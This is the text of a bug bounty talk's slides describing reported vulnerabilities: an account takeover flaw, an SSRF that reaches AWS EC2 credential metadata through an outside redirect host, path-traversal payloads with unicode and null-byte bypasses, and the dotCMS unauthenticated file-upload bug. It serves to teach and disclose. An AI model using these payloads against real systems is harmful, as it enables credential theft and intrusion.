Bug Bounty on Steroids
@Hussein98D
We provide pentests! Visit WebImmunify.com
October 2022
whoami?
Bug Bounty Hunter 
Security Researcher
Yahoo Elite
Intigriti 1337up0533 winner
H1-2010 Vigilante Award
H1-2010 Best Team Collaboration
BugCrowd BugBash Best Team Collaboration
+1000 vulnerabilities reported
CEO @ WebImmunify.com
@hussein98d on all platforms
●Account TakeOver via Confusion
●The Un-spotable SSRF
●Local File Disclosure and Bypasses
●Hacking a Bank by Finding a 0day
●SSO Bypass Techniques
●Another XSS Level
In this talk:
●  Application allows user A to invite other users: B, 
to his organization
●  User A is able to ask for password reset for 
accounts he invited
●  User B gets reset token link in his mails
Account TakeOver via Confusion
Can we try to exploit this?
PoC
● User A invites user B to his instance where user 
B is his second email address
● User A asks for password reset of user B
● User B opens the reset link and waits
● User A edits User B’s email to victim’s email
● Reset Password Tokens becomes valid for 
Victim
Account TakeOver via Confusion
 User A
 User B
Step 1
Invitation to join org
Step 2
 User A
Password Reset inside App
 User B
Account TakeOver via Confusion
 User B
 User B
Step 3
Opens Link to Password Reset
Step 4
 User A
Change email of user B to victim’s
Link
Account TakeOver via Confusion
Attacker
Victim
Step 5
Reset Password via previous link
Step 6
Attacker
Login with new password
Victim
Account TakeOver via Confusion
The Un-spotable SSRF
Anything catches your attention?
The Un-spotable SSRF
__region=eu-west-1
Where do we usually see this parameter’s value?
AWS S3!
The Un-spotable SSRF
Testing Methodology for such endpoints
First, we set a random value inside the __region parameter
__region=test&Action=ListTopics&appId=223
Result:
Timeout response
That’s fishy!
The Un-spotable SSRF
Testing Methodology for such endpoints
Fuzzing
Build a little list containing different payloads to hopefully identify some behavior
list.txt :
0xp.cc
0xp.cc/
@0xp.cc
\\0xp.cc
//0xp.cc
.0xp.cc/
.0xp.cc
%2f%2f0xp.cc
The Un-spotable SSRF
Testing Methodology for such endpoints
Upon sending payload 0xp.cc/ inside the __region parameter, I got a DNS 
pingback to sns.0xp.cc
The Un-spotable SSRF
Testing Methodology for such endpoints
What’s happening in the backend?
The application looks like to be reading the __region parameter value and 
issuing the following request:
GET https://sns.REGION.amazonaws.com
Thus, upon sending 0xp.cc/ in the payload, we have the following request 
being issued by the server:
GET https://sns.0xp.cc/.amazonaws.com
The Un-spotable SSRF
Testing Methodology for such endpoints
Breaking out of the syntax
We have to find a way to force our destination host for the request being made by 
the application:
Payload: PI:EMAIL/ 
Server’s translation: https://PI:EMAIL/.amazonaws.com
The Un-spotable SSRF
Testing Methodology for such endpoints
Testing to fetch Google.com ’s content:
The Un-spotable SSRF
Testing Methodology for such endpoints
Good! But not enough! How can we read AWS secrets located at 
http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-
credentials/ec2-instance ?
The application is doing https requests, while we need http to hit the EC2 
endpoints.
The Un-spotable SSRF
Testing Methodology for such endpoints
Forcing Redirect to http
Payload:
PI:EMAIL/custom-30x/?code=301&url=http://169.254.169.254/
latest/meta-data/identity-credentials/ec2/security-credentials/ec2-
instance&Action=ListTopics&appId=oegw3x
The Un-spotable SSRF
Testing Methodology for such endpoints
Forcing Redirect to http
PI:EMAIL/custom-30x/?code=301&url=http://169.254.169.254/
latest/meta-data/identity-credentials/ec2/security-credentials/ec2-
instance&Action=ListTopics&appId=oegw3x
Application’s request:
https://PI:EMAIL/custom-30x/?code=301&url=http://
169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/
ec2-instance
Redirect to ssrf.localdomain.pw and then redirect to 169.254.169.254
The Un-spotable SSRF
Testing Methodology for such endpoints
However, there is still a little issue:
Application’s request:
https://PI:EMAIL/custom-30x/?code=301&url=http://
169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/
ec2-instance/.amazonaws.com
Easy bypass now, append “?” to the end of our previous payload:
PI:EMAIL/custom-30x/?code=301&url=http://169.254.169.254/
latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance?
&Action=ListTopics&appId=oegw3x
The Un-spotable SSRF
Testing Methodology for such endpoints
PI:EMAIL/custom-30x/?code=301&url=http://169.254.169.254/latest/meta-data/identity-
credentials/ec2/security-credentials/ec2-instance?&Action=ListTopics&appId=oegw3x
https://PI:EMAIL/custom-30x/?code=301&url=http://169.254.169.254/latest/meta-data/
identity-credentials/ec2/security-credentials/ec2-instance?/.amazonaws.com
https://ssrf.localdomain.pw/custom-30x/?code=301&url=http://169.254.169.254/latest/meta-
data/identity-credentials/ec2/security-credentials/ec2-instance?/.amazonaws.com
http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-
credentials/ec2-instance?/.amazonaws.com
Application’s parser
301 Redirect
301 Redirect
The Un-spotable SSRF
Testing Methodology for such endpoints
Bingo!
Bounty: $14,000
Local File Disclosure and Bypasses
You see this:
Download.php?file=document.pdf
First thoughts? 
Potential LFD
Local File Disclosure and Bypasses
Classic payloads
Download.php?file=file:///etc/passwd
Download.php?file=../../../../etc/passwd
Download.php?file=..\..\..\..\etc\passwd
403 forbidden
Local File Disclosure and Bypasses
Server doesn’t love ../ dot dot slash
What can we do?
● Unicode encoding
● Null Byte
Local File Disclosure and Bypasses
Unicode Encoding
https://qaz.wtf/u/convert.cgi?text=.
Local File Disclosure and Bypasses
Unicode Encoding
Try:
⨀
⊡
Download.php?file=.
/config.php
⨀
Download.php?file=⊡
/config.php
⨀
Download.php?file=
.
⊡ /config.php
Local File Disclosure and Bypasses
Null Byte Bypass
Try:
.%00.
Download.php?file=.%00./config.php
Local File Disclosure and Bypasses
Null Byte Bypass
Bounty: $1700
Hacking a Bank by Finding a 0day
In collaboration with @infosec_au
Are you really a hacker if you never 
hacked a bank? 
The story of CVE-2022-26352
Hacking a Bank by Finding a 0day
In collaboration with @infosec_au
Invited to a bug bounty program of a big Bank
First things first, RECON:
Most of the domains and subdomains in scope 
are running DotCMS
Hacking a Bank by Finding a 0day
In collaboration with @infosec_au
What is dotCMS?
dotCMS is an open source content 
management system written in Java for 
managing content and content driven sites and 
applications.
Hacking a Bank by Finding a 0day
In collaboration with @infosec_au
Everyone was looking for low hanging bugs, 
we chose to go for the less traveled path: 
whitebox source code auditing
Hacking a Bank by Finding a 0day
In collaboration with @infosec_au
Bug 1: No Authentication needed for some APIs 
File: com/dotcms/rest/ContentResource.java
/*      */ @Path("/content")
/*      */ public class ContentResource
... omitted for brevity ...
/*      */   @Deprecated
/*      */   @POST
/*      */   @Path("/{params:.*}")
/*      */   @Produces({"text/plain"})
/*      */   @Consumes({"multipart/form-data"})
/*      */   public Response multipartPOST(@Context HttpServletRequest request, @Context HttpServletResponse response, 
FormDataMultiPart multipart, @PathParam("params") String params) throws URISyntaxException, DotDataException {
/* 1532 */     return multipartPUTandPOST(request, response, multipart, params, "POST");
/*      */   }
/*      */   @Deprecated
/*      */   @PUT
/*      */   @Path("/{params:.*}")
/*      */   @Produces({"application/json", "application/javascript", "text/plain"})
/*      */   @Consumes({"multipart/form-data"})
/*      */   public Response multipartPUT(@Context HttpServletRequest request, @Context HttpServletResponse response, 
FormDataMultiPart multipart, @PathParam("params") String params) throws URISyntaxException, DotDataException {
/* 1508 */     return multipartPUTandPOST(request, response, multipart, params, "PUT");
/*      */   }
Hacking a Bank by Finding a 0day
In collaboration with @infosec_au
Bug 2: Arbitrary File Upload
/*      */   private void processFile(Contentlet contentlet, List usedBinaryFields, 
List binaryFields, BodyPart part) throws IOException, DotSecurityException, 
DotDataException {
/* 1657 */     InputStream input = (InputStream)part.getEntityAs(InputStream.class);
/* 1658 */     String filename = part.getContentDisposition().getFileName();
/* 1659 */     File tmpFolder = new 
File(String.valueOf(APILocator.getFileAssetAPI().getRealAssetPathTmpBinary()) + 
UUIDUtil.uuid());
/*      */     
/* 1661 */     if (!tmpFolder.mkdirs()) {
/* 1662 */       throw new IOException("Unable to create temp folder to save binaries");
/*      */     }
/*      */     
/* 1665 */     File tempFile = new File(
/* 1666 */         String.valueOf(tmpFolder.getAbsolutePath()) + File.separator + filename);
/* 1667 */     Files.deleteIfExists(tempFile.toPath());
/*      */     
/* 1669 */     FileUtils.copyInputStreamToFile(input, tempFile);
/* 1670 */     List fields = (new LegacyFieldTransformer(
/* 1671 */         APILocator.getContentTypeAPI(APILocator.systemUser())
/* 1672 */         .find(contentlet.getContentType().inode()).fields()))
/* 1673 */       .asOldFieldList();
/* 1674 */     for (Field field : fields) {
Hacking a Bank by Finding a 0day
In collaboration with @infosec_au
Bug 1 + Bug 2 
Connecting the dots, we have an 
unauthenticated API and an 
arbitrary file upload
RCE?